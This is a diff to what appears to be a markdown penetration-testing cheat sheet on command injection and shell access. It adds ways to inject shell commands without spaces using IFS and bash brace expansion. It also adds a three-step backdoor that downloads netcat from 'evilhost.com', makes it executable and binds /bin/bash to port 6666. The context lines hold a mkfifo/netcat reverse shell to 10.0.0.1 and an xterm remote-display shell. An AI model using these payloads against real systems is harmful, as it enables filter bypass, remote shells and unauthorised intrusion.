@@ -30,6 +30,20 @@ Backtick
 Background 
 ``` `blah & blah2` ```
 
+***Shell commands without spaces***
+Using Internal Field Separator (IFS)
+
+Test for cmd injection withouot spaces:<br>
+```sleep${IFS:0:1}20```
+
+Example netcat backdoor without spaces:
+```{wget,http://evilhost.com/nc}```
+```{chmod,+x,./nc}```
+```{./nc,-l,-p,6666,-e,/bin/bash```
+
+See: https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/<br>
+
+
 **Exfiltrating Files / Data**
 
 FTP 
@@ -77,14 +91,14 @@ Netcat
 
 ``` $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```
 
-```
-XTERM:
-Server: 
-$ xterm -display 10.0.0.1:1
+
+XTERM:<br>
+Server: <br>
+```$ xterm -display 10.0.0.1:1```
 Listener:
-$ Xnest :1
-$ xhost +targetip
-```
+```$ Xnest :1```
+```$ xhost +targetip```
+
 
 
 
